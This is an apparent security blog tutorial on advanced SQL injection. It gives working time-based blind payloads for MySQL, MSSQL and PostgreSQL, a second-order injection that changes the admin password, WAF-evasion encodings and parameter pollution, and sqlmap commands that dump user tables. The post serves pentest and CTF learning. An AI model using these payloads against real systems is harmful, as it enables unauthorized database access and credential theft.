Advanced SQL Injection: Beyond Basic UNION Attacks

Feb 3, 2025 SQLi WAF Bypass Blind Injection ~15 min read

Most SQL injection tutorials stop at UNION-based extraction. But in real pentests and CTFs, UNION attacks rarely work out of the box — columns don't match, WAFs block quotes, or the output isn't reflected anywhere. This post covers the techniques I rely on when the basics fail: blind time-based injection, second-order SQLi, and WAF bypass strategies.

Why UNION Attacks Often Fail

UNION-based injection requires:

  • The exact number of columns to match the original query
  • Compatible data types in each column position
  • Output to be reflected somewhere in the HTTP response
  • No WAF blocking keywords like UNION, SELECT, or --

In modern apps, most of these conditions fail. That's when you need to go blind.

Blind Time-Based Injection

When there's no reflected output, time-based blind SQLi lets you extract data one bit at a time by measuring response delays. The database sleeps for a defined interval if a condition is true.

MySQL — SLEEP()

Basic time-based payload
-- True condition: response delays ~5 seconds
1' AND SLEEP(5)-- -

-- Extract DB version char by char
1' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0)-- -

-- Extract username
1' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0)-- -

MSSQL — WAITFOR DELAY

MSSQL time-based
-- Delay 5 seconds if SA account exists
'; IF (SELECT COUNT(*) FROM master..syslogins
   WHERE name='sa') > 0 WAITFOR DELAY '0:0:5'-- 

-- Extract database name
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1)) > 64)
   WAITFOR DELAY '0:0:5'--

PostgreSQL — pg_sleep()

PostgreSQL time-based
'; SELECT CASE WHEN (username='admin') 
   THEN pg_sleep(5) ELSE pg_sleep(0) END 
   FROM users--
ⓘ Automation Tip

Manual time-based extraction is painfully slow. Use SQLMap with --technique=T --dbms=mysql --level=3 to automate it. For custom payloads, write a Python script that measures response.elapsed.total_seconds().

Second-Order SQL Injection

Second-order (or stored) SQLi is the sneakiest variant. The malicious input is stored in the database safely, then later used in a different query without sanitization. Detection requires understanding the full data flow, not just the input point.

Classic Example: Username Registration

Step 1 — Register with injected username
Username: admin'-- 
Password: anything123
Step 2 — The stored value is reused in a password-change query
-- Application code (vulnerable):
query = "UPDATE users SET password='" + new_pass + 
        "' WHERE username='" + session_user + "'"

-- With our injected username, this becomes:
UPDATE users SET password='anything' WHERE username='admin'-- '
-- The -- comments out the rest, changing admin's password!
⚠ Why It's Hard to Find

Input validation at registration may look secure. The vulnerability only manifests when that stored value is retrieved and used in a new query — often in a completely different feature of the app.

WAF Bypass Techniques

Modern WAFs block obvious SQLi patterns. Here are the encoding and obfuscation tricks that still work:

1. Case Variation & Comments

Obfuscation
-- Blocked:
UNION SELECT 1,2,3--

-- Bypasses:
UnIoN/**/SeLeCt/**/1,2,3--
/*!UNION*/ /*!SELECT*/ 1,2,3--
UNION%20SELECT%201,2,3--

2. URL & Double Encoding

Encoding bypass
-- Space → %20 or /**/  or %09 (tab) or %0a (newline)
-- Single quote → %27 or %2527 (double-encoded)
-- Equals → LIKE or regexp or %3d

1'%20AND%20'1'%3d'1
1' AND 1 LIKE 1--

3. HTTP Parameter Pollution

HPP — splitting payloads across params
GET /search?id=1 UNION&id= SELECT 1,2,3--
# Some backends concatenate duplicate params
# WAF sees two clean params; backend sees one injection

4. Chunked Transfer & JSON Injection

JSON SQLi (MySQL)
-- JSON field directly in SQL query:
{"username": "admin' AND 1=1-- ", "password": "x"}

-- MySQL JSON functions abused:
{"id": "1 AND JSON_LENGTH('[1,2,3]')=3-- "}

Automating with SQLMap — Advanced Flags

SQLMap is powerful but noisy by default. These flags make it surgical:

SQLMap advanced usage
# Blind only, MySQL, high risk/level, with WAF tamper
sqlmap -u "https://target.com/item?id=1" \
  --technique=BT \
  --dbms=mysql \
  --level=5 --risk=3 \
  --tamper=space2comment,between,randomcase \
  --batch --dump -T users

# POST request
sqlmap -u "https://target.com/login" \
  --data="user=admin&pass=test" \
  -p user --dbs

Key Takeaways

  • When UNION fails, switch to time-based blind — it works even with no output reflection
  • Always trace data flow end-to-end; second-order injection hides in features far from the input
  • WAF bypass is mostly about encoding + fragmentation — WAFs parse HTTP differently than databases
  • SQLMap's --tamper scripts are underused — combine multiple tampers for better WAF evasion
  • Always test with --level=5 --risk=3 in CTF environments; default settings miss a lot
